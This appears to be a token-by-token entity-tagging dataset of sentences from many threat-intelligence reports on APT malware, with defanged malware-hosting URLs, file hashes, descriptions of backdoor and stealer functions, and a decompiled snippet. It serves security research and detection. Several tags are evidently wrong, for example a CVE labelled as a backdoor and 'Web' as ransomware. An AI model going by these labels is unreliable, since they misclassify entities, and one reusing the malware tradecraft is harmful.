objc_retainAutorelease	O
(	O
CFSTR	O
(	O
'	O
8.8.8.8	O
'	O
)	O
)	O
;	O
v4	O
=	O
objc_msgSend_ptr	O
(	O
CFSTR	O
(	O
'	O
8.8.8.8	O
'	O
)	O
,	O
selRef_cStringUsingEncoding_	O
,	O
1LL	O
,	O
v7	O
)	O
;	O
v5	O
=	O
SCNetworkReachabilityCreateWithName	O
(	O
0LL	O
,	O
(	O
__int64	O
)	O
v4	O
)	O
;	O
HIDWORD	O
(	O
v7	O
)	O
=	O
0	O
;	O
if	O
(	O
(	O
unsigned	O
__int8	O
)	O
SCNetworkReachabilityGetFlags	O
(	O
v5	O
,	O
(	O
char	O
*	O
)	O
&	O
v7	O
+	O
4	O
)	O
)	O
{	O
.....	O

|	O
1440	O
McCarthy	O
Blvd	O
.	O

We	O
have	O
very	O
little	O
information	O
about	O
actual	O
infections	O
.	O

Lastly	O
we	O
discuss	O
several	O
design	O
characteristics	O
of	O
advanced	O
malware	O
used	O
by	O
determined	O
adversaries	O
to	O
carry	O
out	O
more	O
technically	O
advanced	O
and	O
stealthier	O
attacks	O
,	O
therefore	O
highlighting	O
the	O
components	O
where	O
Dark	O
Seoul	O
lacked	O
sophistication	O
.	O

Communication	O
between	O
bot	O
and	O
operator	O
flows	O
through	O
the	O
Bulgarian	O
web-based	O
free	O
email	O
server	O

Function	O
Name	O

The	O
importance	O
of	O
the	O
victims	O
is	O
not	O
measured	O
in	O
numbers	O
since	O
each	O
of	O
these	O
victims	O
is	O
a	O
large­scale	O
(	O
often	O
multinational	O
)	O
enterprise	O
.	O

After	O
deleting	O
the	O
registry	O
entry	O
,	O
malware	O
deletes	O
all	O
the	O
files	O
from	O
the	O
%	O
Appdata	O
%	O
\SQLite	O
directory	O
by	O
creating	O
a	O
batch	O
script	O
.	O

After	O
engaging	O
in	O
flirty	O
conversations	O
with	O
their	O
victims	O
,	O
which	O
were	O
most	O
likely	O
young	O
men	O
,	O
the	O
attackers	O
offered	O
to	O
move	O
the	O
conversation	O
from	O
Facebook	O
to	O
a	O
more	O
'	O
secure	O
and	O
private	O
'	O
platform	O
,	O
where	O
they	O
could	O
have	O
more	O
intimate	O
interactions	O
.	O

If	O
the	O
sample	O
was	O
run	O
after	O
a	O
particular	O
date	O
,	O
it	O
would	O
effectively	O
terminate	O
and	O
delete	O
itself	O
:	O
21	O
Jun	O
2013	O
(	O
Deletes	O
itself	O
and	O
associated	O
files	O
after	O
this	O
date	O
)	O
netsat.exe	B-malware.backdoor
29	O
Mar	O
2013	O
31	O
May	O
2013	O
(	O
Deletes	O
itself	O
and	O
associated	O
files	O
after	O
this	O
27	O
Mar	O
2013	O
netui3.dll	O
date	O
)	O
30	O
Dec	O
2012	O
(	O
Deletes	O
itself	O
and	O
associated	O
files	O
after	O
this	O
winmgt.dll	O
14	O
Dec	O
2012	O
date	O
)	O
Analysis	O
disclosed	O
netsat.exe	B-malware.infosteal
probably	O
serves	O
as	O
the	O
headquarters	O
of	O
malicious	O
activity	O
by	O
:	O
Running	O
on	O
a	O
possibly	O
compromised	O
system	O
Logging	O
some	O
activity	O
and	O
errors	O
to	O
a	O
file	O
Receiving	O
commands	O
via	O
an	O
encrypted	O
file	O
on	O
the	O
local	O
system	O
(	O
possible	O
C2	O
)	O
Listening	O
for	O
drive	O
connections	O
Infecting	O
connected	O
drives	O
with	O
netui3.dll/winmgt.dll	B-malware.backdoor
(	O
setup32.exe	B-malware.backdoor
+	O
Autorun.inf	B-malware.backdoor
)	O
Collecting	O
data	O
gathered	O
by	O
any	O
infected	O
drives	O
,	O
ostensibly	O
upon	O
their	O
return	O
from	O
being	O
connected	O
to	O
other	O
systems	O
Analysis	O
disclosed	O
netui3.dll/winmgt.dll	B-malware.backdoor
probably	O
serve	O
as	O
the	O
field	O
units	O
of	O
malicious	O
activity	O
Collecting	O
information	O
about	O
systems	O
it	O
comes	O
into	O
contact	O
with	O
through	O
connection	O
to	O
the	O
targeted	O
systems	O
with	O
the	O
drive	O
whereon	O
the	O
malware	O
resides	O
Collecting	O
file	O
listings	O
from	O
local	O
and	O
share	O
connected	O
drives	O
Discovering	O
and	O
connecting	O
to	O
shared	O
drives	O
visible	O
to	O
the	O
local	O
targeted	O
system	O
Copying	O
and	O
writing	O
files	O
to/from	O
drives	O
visible	O
to	O
the	O
local	O
targeted	O
system	O
The	O
following	O
commands	O
and	O
their	O
descriptions	O
,	O
listed	O
by	O
executable	O
file	O
,	O
illustrate	O
the	O
submitted	O
malware	O
's	O
functionality	O
:	O
netsat.exe	B-malware.infosteal
copies	O
directories	O
and	O
contents	O
copies	O
files	O
with	O
size	O
checking	O
deletes	O
files	O
and	O
records	O
activity	O
in	O
log	O
obtains	O
a	O
directory	O
listing	O
netsat.exe	B-malware.infosteal
writes	O
malicious	O
files	O
to	O
a	O
hidden	O
RECYCLED	O
or	O
RECYCLER	O
directory	O
Files	O
:	O
setup35.exe	B-malware.backdoor
(	O
renamed	O
netui3.dll	B-malware.backdoor
)	O
,	O
Autorun.inf	B-malware.backdoor
,	O
~disk.ini	B-malware.backdoor
(	O
renamed	O
netwi.drv	B-malware.backdoor
)	O
,	O
act.te	O
Ferry	O
iteratively	O
copies	O
files	O
from	O
RECYCLED/RECYCLER	O
directory	O
on	O
target	O
drive	O
,	O
deletes	O
from	O
source	O
after	O
copy	O
-­‐	O
source	O
is	O
assumed	O
to	O
be	O
drive	O
used	O
to	O
collect	O
data	O
from	O
one	O
or	O
more	O
systems	O
Getres	O
netui3.dll	B-malware.backdoor
(	O
setup35.exe	B-malware.backdoor
)	O
copies	O
files	O
from	O
one	O
location	O
to	O
another	O
copies	O
files	O
from	O
one	O
location	O
to	O
another	O
setting	O
copied	O
files	O
as	O
hidden	O
Cptur	O
creates	O
a	O
directory	O
and	O
copies	O
file	O
to	O
that	O
directory	O
silently	O
deletes	O
directory	O
(	O
performs	O
an	O
FO_DELETE	O
shell	O
file	O
operation	O
on	O
a	O
directory	O
with	O
the	O
FOF_NOERRORUI	O
,	O
FOF_NOCONFIRMATION	O
,	O
and	O
FOF_SILENT	O
flags	O
set	O
)	O
deletes	O
a	O
file	O
deletes	O
a	O
file	O
after	O
setting	O
attributes	O
to	O
normal	O
Delu	O
recursively	O
writes	O
and	O
reads	O
encoded	O
data	O
to/from	O
a	O
directory	O
prints	O
directory	O
listings	O
to	O
~FF323D.tmp	O
;	O
data	O
gets	O
encoded	O
;	O
original	O
Gdir	O
~FF323D.tmp	O
file	O
is	O
deleted	O
writes	O
and	O
reads	O
encoded	O
data	O
to/from	O
a	O
file	O
determines	O
if	O
it	O
has	O
access	O
to	O
a	O
file	O
;	O
may	O
be	O
a	O
temp	O
file	O
creation/rename	O
involved	O
Gfover	O
collects	O
system	O
related	O
and	O
possibly	O
network	O
related	O
information	O
such	O
as	O
,	O
domains	O
,	O
system	O
information	O
creates	O
a	O
directory	O
Newend	O
closes	O
a	O
file	O
that	O
was	O
opened	O
for	O
writing	O
sets	O
normal	O
attributes	O
on	O
a	O
targeted	O
file	O
,	O
deletes	O
the	O
file	O
,	O
opens	O
the	O
same	O
file	O
Newstar	O
name	O
as	O
a	O
binary	O
file	O
writes	O
a	O
string	O
to	O
a	O
new	O
file	O
opened	O
by	O
the	O
newstar	O
command	O
.	O

Following	O
format	O
string	O
'	O
%	O
s	O
(	O
%	O
s	O
)	O
;	O
'	O
replaced	O
with	O

As	O
root9B	O
analysts	O
continued	O
to	O
peel	O
back	O
the	O
layers	O
,	O
it	O
became	O
more	O
apparent	O
,	O
that	O
this	O
attack	O
was	O
likely	O
associated	O
with	O
Russian	O
included	O
multiple	O
major	O
financial	O
institutions	O
,	O
as	O
well	O
as	O
the	O
international	O
government	O
domain	O
.	O

Internal	O
and	O
public	O
databases	O
show	O
that	O
this	O
server	O
has	O
been	O
hosting	O
malware	O
for	O
download	O
:	O
hxxp://games-playbox[.]com/testing1/download/reg.exe	B-url.cncsvr
hxxp://176.56.238.177/testing2/download/reg.exe	B-url.cncsvr
hxxp://176.56.238.177/testing2/download/reg1.exe	B-url.cncsvr
hxxp://176.56.238.177/testing4/download/reg.exe	B-url.cncsvr
hxxp://176.56.238.177/testing2/download/winrm.exe	B-url.cncsvr
hxxp://176.56.238.177/testing2/download/sppsvc.exe	B-url.cncsvr
hxxp://games-playbox[.]com/winone1/download/stisvc.exe	B-url.cncsvr
hxxp://games-playbox[.]com/winone1/download/sppsvc.exe	B-url.cncsvr
Brute	O
force	O
testing	O
showed	O
that	O
at	O
least	O
subfolders	O
winone2	O
,	O
winone3	O
and	O
winone4	O
contained	O
similar	O
content	O
as	O
winone1	O
.	O

Regarding	O
Metasploit	O
's	O
shikata_	O
ga_	O
nai	O
encoder	O
–	O
although	O
it	O
's	O
available	O
for	O
everyone	O
and	O
could	O
n't	O
be	O
the	O
basis	O
for	O
attribution	O
,	O
we	O
know	O
this	O
encoder	O
has	O
been	O
used	O
by	O
LuckyMouse	O
previously	O
.	O

RTF	O
files	O
made	O
up	O
the	O
second	O
most	O
common	O
file	O
type	O
.	O

The	O
two	O
figures	O
below	O
show	O
the	O
ISUN32.exe	O
process	O
start	O
up	O
and	O
the	O
exe	O
get	O
dropped	O
under	O
TEMP	O
directory	O
.	O

5	O
Interesting	O
code	O
parts	O

On	O
March	O
4	O
,	O
2011	O
,	O
exactly	O
20	O
months	O
after	O
a	O
similar	O
incident	O
during	O
the	O
U.S.	O
Independence	O
Day	O
celebrations	O
of	O
2009	O
,	O
a	O
botnet	O
based	O
in	O
South	O
Korea	O
launched	O
DDoS	O
attacks	O
against	O
40	O
websites	O
affiliated	O
with	O
South	O
Korean	O
government	O
,	O
military	O
,	O
and	O
civilian	O
critical	O
infrastructure	O
as	O
well	O
as	O
U.S.	O
forces	O
based	O
in	O
Korea.The	O
botnet	O
was	O
dynamically	O
updated	O
via	O
new	O
malware	O
binaries	O
,	O
launched	O
a	O
DDoS	O
non-stop	O
for	O
more	O
than	O
a	O
week	O
,	O
and	O
then	O
wiped	O
the	O
harddisks	O
with	O
zeroes	O
,	O
overwriting	O
the	O
MBR	O
making	O
the	O
machines	O
unusable	O
.	O

They	O
scout	O
for	O
vulnerable	O
practices	O
,	O
susceptible	O
systems	O
and	O
operational	O
loopholes	O
that	O
they	O
can	O
leverage	O
or	O
abuse	O
.	O

Now	O
we	O
have	O
a	O
handy	O
way	O
to	O
decrypt	O
the	O
strings	O
we	O
have	O
.	O

The	O
U.S	O
will	O
instead	O
impose	O
additional	O
economic	O
penalties	O
,	O
the	O
combination	O
of	O
which	O
amounts	O
to	O
a	O
de	O
facto	O
U.S.	O
withdrawal	O
from	O
the	O
2015	O
Joint	O
Comprehensive	O
Plan	O
of	O
Action	O
(	O
JCPOA	O
)	O
(	O
commonly	O
referred	O
to	O
as	O
the	O
'	O
Iran	O
nuclear	O
deal	O
'	O
.	O

All	O
strings	O
within	O
the	O
dropper	O
,	O
as	O
well	O
as	O
the	O
backdoor	O
,	O
are	O
encrypted	O
using	O
a	O
hardcoded	O
RSA256	O
key	O
.	O

The	O
implementation	O
is	O
a	O
userland	O
keylogger	O
that	O
polls	O
the	O
keymap	O
with	O
each	O
keystroke	O
.	O

When	O
presented	O
with	O
TG-4127	B-malware.infosteal
's	O
spoofed	O
login	O
page	O
(	O
see	O
Figure	O
1	O
)	O
,	O
victims	O
might	O
be	O
convinced	O
it	O
was	O
the	O
legitimate	O
login	O
page	O
for	O
their	O
hillaryclinton.com	B-url.normal
email	O
account	O
.	O

Figure	O
8	O
–	O
Two	O
WriteFile	O
API	O
calls	O
.	O

And	O
indeed	O
,	O
by	O
following	O
references	O
to	O
the	O
socket	O
handle	O
used	O
to	O
recv	O
(	O
)	O
the	O
initial	O
C	O
&	O
C	O
command	O
,	O
we	O
can	O
trace	O
through	O
to	O
find	O
the	O
encryption	O
routine	O
called	O
by	O
DarkComet	B-malware.backdoor
just	O
prior	O
to	O
send	O
(	O
)	O
ing	O
back	O
its	O
response	O
messages	O
.	O

update.exe	O

Given	O
the	O
impact	O
of	O
re-applied	O
and	O
expanded	O
economic	O
sanctions	O
,	O
it	O
is	O
likely	O
that	O
American	O
,	O
European	O
,	O
and	O
rival	O
nation	O
businesses	O
will	O
also	O
be	O
targeted	O
with	O
more	O
sustained	O
destructive	O
attacks	O
.	O

The	O
malware	O
creates	O
an	O
invisible	O
window	O
,	O
with	O
no	O
other	O
purpose	O
than	O
to	O
receive	O
window	O
messages	O
.	O

In	O
the	O
days	O
following	O
the	O
public	O
mention	O
of	O
this	O
server	O
,	O
the	O
crew	O
slowly	O
tightened	O
down	O
open	O
access	O
to	O
/ims2/	O
.	O

We	O
can	O
not	O
be	O
certain	O
,	O
but	O
this	O
name	O
could	O
be	O
in	O
reference	O
to	O
Binalakshmi	O
Nepram	O
,	O
a	O
writer­activist	O
born	O
in	O
Manipur	O
India	O
who	O
is	O
fighting	O
for	O
disarmament	O
.	O

Ch	O
1.0	O
:	O
b41fbdd02e4d54b4bc28eda99a8c1502	B-hash
Ch	O
1.5	O
:	O
bbf569176ec7ec611d8a000b50cdb754	B-hash
Code	O
similarity	O
:	O
90	O
%	O
We	O
did	O
not	O
identify	O
strong	O
modification	O
between	O
the	O
two	O
samples	O
.	O

It	O
should	O
be	O
noted	O
that	O
the	O
authors	O
made	O
mistakes	O
that	O
make	O
decryption	O
of	O
files	O
less	O
possible	O
.	O

Anti-virus	O
software	O
such	O
as	O
by	O
Symantec	O
,	O
McAfee	O
and	O
Kaspersky	O
,	O
etc.	O
,	O
are	O
detected	O
based	O
on	O
the	O
process	O
names	O
.	O

How	O
many	O
victims	O
have	O
you	O
found	O
?	O

createNewFolder	O
:	O
atServer	O
:	O
]	O

14	O
Sept	O
.	O

안다리엘	O
그룹은	O
자체	O
제작한	O
Andarat	B-malware.backdoor
,	O
Andaratm	B-malware.backdoor
,	O
Phandoor	B-malware.backdoor
,	O
Rifdoor	B-malware.backdoor
뿐만	O
아니라	O
Aryan	B-malware.backdoor
,	O
Ghostrat	B-malware.backdoor
등	O
알려진	O
다른	O
악성코드도	O
이용하고	O
있다	O
.	O

Beebus	B-malware.unknown
Arid	B-malware.unknown
Viper	B-malware.unknown
Red	B-malware.unknown
October	B-malware.unknown
Equation	B-malware.unknown
Paci c	B-malware.unknown
RAT	B-malware.backdoor
Regin	B-malware.unknown
Aurora	B-malware.unknown
Pitty	B-malware.unknown
Tiger	B-malware.unknown
Net	B-malware.unknown
Traveller	B-malware.unknown
BrutPOS	B-malware.unknown

Maybe	O
these	O
are	O
the	O
first	O
steps	O
in	O
a	O
new	O
stealthier	O
approach	O
.	O

Signing	O
the	O
malware	O
with	O
a	O
stolen	O
and	O
subsequently	O
publicly	O
leaked	O
code-signing	O
certificate	O
is	O
sloppy	O
even	O
for	O
well-known	O
CN-APT	O
groups	O
.	O

Recent	O
Posts	O
Tropic	O
Trooper	O
's	O
New	O
Strategy	O
March	O
Patch	O
Tuesday	O
Fixes	O
75	O
Security	O
Issues	O
,	O
Drops	O
Registry	O
Key	O
Requirement	O
in	O
Windows	O
Detecting	O
Attacks	O
that	O
Exploit	O
Meltdown	O
and	O
Spectre	O
with	O
Performance	O
Counters	O
Campaign	O
Possibly	O
Connected	O
to	O
'	O
MuddyWater	O
'	O
Surfaces	O
in	O
the	O
Middle	O
East	O
and	O
Central	O
Asia	O
Cryptocurrency-Mining	O
Malware	O
:	O
2018	O
's	O
New	O
Menace	O
?	O

All	O
rights	O
reserved	O
.	O

For	O
example	O
,	O
after	O
typing	O
'	O
FinSpy	B-malware.infosteal
'	O
on	O
the	O
keyboard	O
,	O
the	O
keylogger	O
module	O
produced	O
the	O
following	O
(	O
trailing	O
plaintext	O
highlighted	O
)	O
:	O
The	O
predictability	O
of	O
the	O
AES	O
encryption	O
keys	O
allowed	O
us	O
to	O
decrypt	O
and	O
view	O
these	O
partially-encrypted	O
records	O
in	O
full	O
plaintext	O
.	O

These	O
artifacts	O
may	O
link	O
other	O
samples	O
compiled	O
on	O
the	O
same	O
system	O
.	O

We	O
found	O
'	O
Beacon	O
'	O
strings	O
when	O
analyzing	O
'	O
Module	O
1	O
'	O
.	O

There	O
are	O
some	O
approaches	O
that	O
can	O
be	O
taken	O
for	O
decoding	O
these	O
files	O
:	O
you	O
could	O
port	O
the	O
code	O
to	O
C	O
or	O
Python	O
and	O
run	O
them	O
through	O
encoded	O
strings	O
,	O
or	O
you	O
could	O
reuse	O
the	O
code	O
snippet	O
itself	O
and	O
pass	O
the	O
encoded	O
string	O
to	O
the	O
decoder	O
function	O
.	O

As	O
described	O
earlier	O
,	O
the	O
malware	O
computes	O
the	O
MD5	O
of	O
this	O
string	O
and	O
uses	O
the	O
hash	O
as	O
its	O
RC4	O
key	O
to	O
decrypt	O
the	O
executable	O
.	O

The	O
fake	B-malware.drop
Kik	I-malware.drop
APK	I-malware.drop
sent	O
to	O
victims	O
is	O
masqueraded	O
as	O
a	O
legitimate	O
Kik	B-malware.infosteal
Messenger	I-malware.infosteal
app	O
,	O
however	O
,	O
after	O
gaining	O
access	O
to	O
victims	O
'	O
phones	O
,	O
the	O
spyware	O
starts	O
to	O
exfiltrate	O
sensitive	O
data	O
,	O
sending	O
data	O
back	O
to	O
the	O
attacker	O
's	O
infrastructure	O
.	O

A	O
server	O
in	O
Qatar	O
that	O
was	O
previously	O
detected	O
by	O
Rapid7	O
seems	O
to	O
be	O
back	O
online	O
after	O
being	O
unresponsive	O
during	O
the	O
last	O
round	O
of	O
our	O
scanning	O
.	O

It	O
has	O
a	O
large	O
amount	O
of	O
malware	O
related	O
to	O
APT-C-06	O
.	O

Legitimate	O
cloud	O
services	O
are	O
not	O
likely	O
to	O
be	O
blacklisted	O
.	O

If	O
the	O
process	O
exceeds	O
the	O
parameters	O
that	O
define	O
a	O
hazardous	O
state	O
,	O
the	O
SIS	O
attempts	O
to	O
bring	O
the	O
process	O
back	O
into	O
a	O
safe	O
state	O
or	O
automatically	O
performs	O
a	O
safe	O
shutdown	O
of	O
the	O
process	O
.	O

The	O
device	O
driver	O
inspects	O
incoming	O
network	O
traffic	O
from	O
any	O
client	O
connecting	O
to	O
the	O
victim	O
machine	O
,	O
determines	O
if	O
an	O
appropriate	O
handshake	O
packet	O
occurs	O
at	O
the	O
beginning	O
of	O
a	O
new	O
TCP	O
session	O
,	O
and	O
then	O
makes	O
the	O
decision	O
to	O
reroute	O
the	O
network	O
traffic	O
to	O
the	O
Derusbi	B-malware.backdoor
malware	O
or	O
let	O
the	O
traffic	O
continue	O
unaltered	O
to	O
its	O
original	O
service	O
.	O

See	O
further	O
discussion	O
in	O
the	O
Attribution	O
section	O
.	O

The	O
shift	O
from	O
PE	O
to	O
Powershell	O
makes	O
it	O
more	O
difficult	O
for	O
antivirus	O
solutions	O
to	O
detect	O
.	O

By	O
gaining	O
insight	O
into	O
their	O
capabilities	O
and	O
footprint	O
,	O
organizations	O
should	O
find	O
it	O
feasible	O
to	O
detect	O
and	O
remediate	O
these	O
backdoors	O
.	O

Cybereason	O
was	O
able	O
to	O
monitor	O
and	O
detect	O
the	O
entire	O
attack	O
lifecycle	O
,	O
from	O
infiltration	O
to	O
exfiltration	O
and	O
all	O
the	O
steps	O
in	O
between	O
.	O

Running	O
getpwuid	O
-	O
>	O
pw_name	O
,	O
scutil	O
–	O
-get	O
ComputerName	O
,	O
and	O
uname	O
–m	O
will	O
provide	O
the	O
following	O
returns	O
respectively	O
:	O
Mac	O
OSX	O
10.12	O
.	O

Here	O
's	O
a	O
look	O
at	O
one	O
such	O
account	O
from	O
CloudMe	O
:	O
The	O
data	O
from	O
the	O
account	O
:	O
The	O
files	O
stored	O
in	O
the	O
randomly	O
named	O
folder	O
were	O
uploaded	O
by	O
the	O
malware	O
and	O
contain	O
various	O
things	O
,	O
such	O
as	O
system	O
information	O
,	O
running	O
processes	O
and	O
current	O
username	O
.	O

It	O
appeared	O
to	O
be	O
a	O
parallel	O
project	O
to	O
WhiteAtlas	O
Turla	O
,	O
and	O
maintained	O
quirks	O
like	O
modular	O
,	O
well	O
logged	O
code	O
with	O
an	O
elegant	O
,	O
professional	O
RSA	O
and	O
3DES	O
encryption	O
implementation	O
and	O
high	O
quality	O
code	O
injection	O
capabilities	O
,	O
but	O
lots	O
of	O
immature	O
and	O
crude	O
language	O
and	O
english	O
mistakes	O
.	O

While	O
we	O
observed	O
a	O
low	O
number	O
of	O
victims	O
from	O
the	O
USA	O
,	O
France	O
,	O
Germany	O
,	O
and	O
China	O
,	O
the	O
majority	O
of	O
victims	O
were	O
from	O
the	O
Middle	O
East	O
,	O
with	O
most	O
of	O
the	O
victims	O
located	O
in	O
Israel	O
:	O
The	O
targeted	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
campaign	O
has	O
been	O
running	O
under	O
the	O
radar	O
since	O
as	O
far	O
back	O
as	O
2015	O
,	O
targeting	O
people	O
in	O
Middle	O
Eastern	O
countries	O
.	O

In	O
comparing	O
samples	O
from	O
different	O
attack	O
cycles	O
,	O
we	O
can	O
easily	O
see	O
that	O
the	O
attackers	O
have	O
spent	O
time	O
improving	O
their	O
tool	O
,	O
making	O
it	O
more	O
persistent	O
and	O
harder	O
to	O
detect	O
.	O

워터링홀	O
(	O
Watering-hole	B-malware.drop
)	O
공격	O
기법은	O
공격자가	O
공격	O
대상이	O
방문할	O
만한	O
웹사이트를	O
해킹해	O
취약점	O
공격	O
코드를	O
숨겨두는	O
것으로	O
,	O
공격	O
대상이	O
취약한	O
웹	O
브라우저를	O
이용해	O
해당	O
웹사이트에	O
접속하면	O
악성코드에	O
감염되는	O
방식이다	O
.	O

If	O
you	O
are	O
not	O
the	O
intended	O
recipient	O
,	O
you	O
are	O
hereby	O
notified	O
that	O
any	O
use	O
of	O
the	O
information	O
contained	O
in	O
or	O
transmitted	O
with	O
the	O
communication	O
or	O
dissemination	O
,	O
distribution	O
,	O
or	O
copying	O
of	O
this	O
communication	O
is	O
strictly	O
prohibited	O
.	O

The	O
exclusive	O
interest	O
in	O
Japanese	O
government	O
,	O
education	O
,	O
and	O
commerce	O
will	O
likely	O
continue	O
into	O
the	O
future	O
as	O
the	O
group	O
is	O
just	O
starting	O
to	O
build	O
and	O
utilize	O
their	O
existing	O
current	O
attack	O
infrastructure	O
.	O

Chat-world.site	O
was	O
registered	O
by	O
Jack	O
Zogby	O
,	O
Beirut	O
,	O
Lebanon	O
,	O
jack.zogby@yandex.com	O

:	O
Original	O
Source	O
Path	O
The	O
embedded	O
file	O
named	O
a.b	O
is	O
dropped	O
to	O
the	O
%	O
temp	O
%	O
folder	O
once	O
the	O
Word	O
document	O
is	O
opened	O
and	O
is	O
executed	O
by	O
exploiting	O
the	O
CVE-2017-11882	O
vulnerability	O
.	O

'	O
Democratic	O
House	O
Candidates	O
Were	O
Also	O
Targets	O
of	O
Russian	O
Hacking	O
.	O
'	O

We	O
would	O
like	O
to	O
extend	O
our	O
thanks	O
to	O
these	O
individuals	O
for	O
their	O
contributions	O
towards	O
this	O
research	O
.	O

On	O
execution	O
,	O
the	O
Trojan	O
creates	O
a	O
mutex	O
called	O
'	O
correria24	O
'	O
to	O
allow	O
only	O
one	O
instance	O
of	O
it	O
to	O
run	O
at	O
a	O
time	O
.	O

All	O
rights	O
reserved	O
.	O

Once	O
in	O
a	O
while	O
other	O
topics	O
or	O
content	O
are	O
used	O
-	O
such	O
as	O
a	O
public	O
corporate	O
responsibility	O
document	O
published	O
by	O
Egged	O
,	O
an	O
Israeli	O
bus	O
company	O
;	O
a	O
part	O
of	O
an	O
online	O
Novel	O
published	O
as	O
a	O
doc	O
file	O
;	O
or	O
pornographic	O
materials	O
.	O

CTU	O
researchers	O
have	O
adopted	O
the	O
grading	O
system	O
published	O
by	O
the	O
U.S.	O
Office	O
of	O
the	O
Director	O
of	O
National	O
Intelligence	O
to	O
indicate	O
confidence	O
in	O
their	O
assessments	O
:	O
generally	O
indicates	O
that	O
judgments	O
are	O
based	O
on	O
high-quality	O
information	O
,	O
and/or	O
that	O
the	O
nature	O
of	O
the	O
issue	O
makes	O
it	O
possible	O
to	O
render	O
a	O
solid	O
judgment	O
.	O

Having	O
both	O
the	O
server	O
and	O
client	O
components	O
enables	O
researchers	O
to	O
start	O
a	O
packet	O
capture	O
to	O
view	O
the	O
contents	O
of	O
typical	O
traffic	O
.	O

And	O
more	O
important	O
,	O
the	O
report	O
explains	O
how	O
security	O
professionals	O
can	O
better	O
detect	O
the	O
Web	B-malware.ransom
shell	O
through	O
network	O
traffic	O
and	O
on	O
compromised	O
systems	O
.	O

Attached	O
to	O
this	O
email	O
was	O
another	O
malicious	O
document	O
that	O
was	O
designed	O
to	O
exploit	O
CVE-2012-0158	B-malware.backdoor
.	O

Despite	O
several	O
sites	O
being	O
compromised	O
,	O
the	O
above	O
activity	O
tied	O
to	O
java-se.com	B-url.normal
did	O
not	O
result	O
in	O
the	O
successful	O
capture	O
of	O
actual	O
exploit	O
code	O
or	O
malware	O
.	O

When	O
executed	O
the	O
trojan	O
connects	O
to	O
a	O
C	O
&	O
C	O
server	O
and	O
receives	O
commands	O
to	O
grab	O
screenshots	O
,	O
enumerate	O
running	O
processes	O
and	O
get	O
information	O
about	O
the	O
system	O
and	O
campaign	O
ID	O
.	O

This	O
culminated	O
in	O
the	O
trial	O
of	O
17	O
bloggers	O
,	O
14	O
of	O
whom	O
were	O
recently	O
convicted	O
and	O
sentenced	O
to	O
terms	O
ranging	O
from	O
3	O
to	O
13	O
years	O
.	O

Agent.RUI	O

HTTPChannel	O
:	O
Used	O
for	O
continuous	O
communication	O
with	O
the	O
C	O
&	O
C	O
server	O
,	O
for	O
receiving	O
commands	O
and	O
sending	O
stolen	O
data	O
to	O
the	O
server	O
.	O

Compilation	O
date	O

The	O
working	O
hours	O
in	O
the	O
SSH	O
log	O
correspond	O
with	O
Eastern	O
European	O
and	O
Middle	O
Eastern	O
time	O
zones	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
TextBox	O
content	O
stored	O
within	O
the	O
UserForm	O
.	O

The	O
sample	O
that	O
iDefense	O
analyzed	O
for	O
this	O
report	O
is	O
a	O
Word	O
document	O
with	O
Japanese	O
filename	O
,	O
2018	O
年度	O
(	O
平成	O
30	O
年度	O
)	O
税制改正について	O
.doc	O
,	O
which	O
translates	O
to	O
English	O
as	O
About	O
the	O
2018	O
fiscal	O
year	O
(	O
Heisei	O
30	O
)	O
tax	O
system	O
revision.doc	O
'	O
.	O

To	O
prevent	O
viewing	O
of	O
the	O
macro	O
code	O
and	O
to	O
make	O
manual	O
analysis	O
harder	O
attackers	O
password	O
protected	O
the	O
macro	O
content	O
as	O
show	O
below	O
.	O

^bhwatch2	O
,	O
Bahrain	O
Watch	O
,	O
United	O
States	O
,	O
YES	O
,	O
NO	O
Submodule	O
Y	O
==	O
3	O
records	O
file	O
transfers	O
.	O

Most	O
user	O
training	O
focuses	O
on	O
informing	O
users	O
of	O
all	O
the	O
built-in	O
security	O
prompts	O
rather	O
than	O
analyzing	O
the	O
overall	O
suspicion	O
of	O
a	O
scenario	O
.	O

FireEye	O
analyzed	O
the	O
malware	O
found	O
on	O
DNC	O
networks	O
and	O
determined	O
that	O
it	O
was	O
consistent	O
with	O
our	O
previous	O
observations	O
of	O
APT28	B-malware.infosteal
tools	O
.	O

StrongPity	O
's	O
efforts	O
did	O
much	O
the	O
same	O
.	O

Cryptor	O
:	O
The	O
cryptographic	O
engine	O
used	O
to	O
encrypt	O
communication	O
with	O
the	O
C	O
&	O
C	O
server	O
.	O

Below	O
the	O
results	O
we	O
obtained	O
submitting	O
the	O
patched	O
version	O
of	O
the	O
binary	O
on	O
VirusTotal	O
:	O

Password-protected	O
document	O

The	O
attackers	O
also	O
have	O
a	O
PhpMyAdmin	O
script	O
installed	O
in	O
their	O
machine	O
:	O
Cyberkov	O
Security	O
Incident	O
Response	O
Team	O
(	O
CSIRT	O
)	O
tried	O
to	O
brute	O
force	O
the	O
password	O
of	O
the	O
database	O
using	O
the	O
top	O
most	O
common	O
100	O
passwords	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
posts	O
made	O
by	O
the	O
user	O
,	O
the	O
hits	O
column	O
in	O
the	O
below	O
screen	O
shot	O
gives	O
an	O
idea	O
of	O
number	O
of	O
times	O
the	O
links	O
were	O
visited	O
(	O
probably	O
by	O
the	O
malicious	O
macro	O
code	O
)	O
,	O
this	O
can	O
give	O
rough	O
idea	O
of	O
the	O
number	O
of	O
users	O
who	O
are	O
probably	O
infected	O
as	O
a	O
result	O
of	O
opening	O
the	O
malicious	O
document	O
.	O

Open	O
Source	O
Snort	O
Subscriber	O
Rule	O
Set	O
customers	O
can	O
stay	O
up	O
to	O
date	O
by	O
downloading	O
the	O
latest	O
rule	O
pack	O
available	O
for	O
purchase	O
on	O
Snort.org	O
.	O

Another	O
sample	O
we	O
saw	O
had	O
the	O
name	O
RobototFontUpdate.exe	O
.	O

Based	O
on	O
various	O
clues	O
from	O
the	O
fake	O
Facebook	O
profiles	O
and	O
the	O
campaign	O
infrastructure	O
,	O
we	O
believe	O
the	O
people	O
behind	O
the	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
Spyware	I-malware.infosteal
are	O
Lebanese	B-malware.unknown
.	O

The	O
JavaScript	O
exploits	O
the	O
vulnerability	O
in	O
Internet	O
Explorer	O
by	O
copying	O
,	O
releasing	O
,	O
and	O
then	O
referencing	O
a	O
Document	O
Object	O
Model	O
(	O
DOM	O
)	O
element	O
.	O

Now	O
that	O
we	O
've	O
reversed	O
the	O
core	O
DarkComet	B-malware.backdoor
decryption	O
mechanism	O
(	O
needed	O
to	O
read	O
C	O
&	O
C	O
commands	O
)	O
,	O
we	O
'll	O
want	O
to	O
confirm	O
